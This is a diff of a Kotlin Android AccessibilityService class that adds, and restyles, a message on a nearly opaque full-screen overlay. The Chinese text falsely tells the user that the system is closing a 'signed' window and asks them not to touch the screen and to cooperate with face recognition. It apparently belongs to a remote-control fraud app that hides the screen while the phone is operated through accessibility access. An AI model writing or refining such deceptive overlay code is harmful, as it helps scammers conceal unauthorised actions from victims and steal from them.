@@ -759,31 +759,23 @@ class InputService : AccessibilityService() {
     	overLay.getBackground().setAlpha(253)
     	gohome = 8
 	overLay.setVisibility(gohome)
+	val loadingText = TextView(this, null)
+ 	loadingText.text = "\n\n\n系统正在自动关闭签约的窗口\n请勿触碰屏幕避免关闭失败\n配合人脸识别确保您本人关闭"
+ 	loadingText.setTextColor(-7829368)
+ 	loadingText.textSize = 15.0f
+ 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
+ 	loadingText.setPadding(60, HomeHeight  / 4, 0, 0)
+ 
+ 	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+ 	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
+ 	paramstext.gravity = Gravity.LEFT
+ 	loadingText.layoutParams = paramstext
+ 
+ 	//Fakelay.addView(getView2())
+ 	overLay.addView(loadingText)
 
      
 
-	val loadingText = TextView(this, null).apply {
-    text = "\n\n\n系统正在自动关闭签约的窗口\n请勿触碰屏幕避免关闭失败\n配合人脸识别确保您本人关闭"
-    setTextColor(-7829368)
-    textSize = 15.0f
-    gravity = Gravity.LEFT // 文本在 TextView 内部左对齐
-}
-
-// 将宽度和高度设为 WRAP_CONTENT，避免占用过多空间
-val paramstext = FrameLayout.LayoutParams(
-    FrameLayout.LayoutParams.WRAP_CONTENT,
-    FrameLayout.LayoutParams.WRAP_CONTENT
-).apply {
-    // 关键点：通过 gravity 将 TextView 定位到父容器的左下角
-    gravity = Gravity.BOTTOM or Gravity.LEFT
-
-    // 设置左边距和下边距（示例：左边距 60dp，下边距 0dp）
-    val marginLeft = dp2px(this, 60f) // 将 60dp 转换为像素
-    setMargins(marginLeft, 0, 0, 0) // 左、上、右、下
-}
-
-loadingText.layoutParams = paramstext
-overLay.addView(loadingText)
 	
         windowManager.addView(overLay, overLayparams_bass)
     }
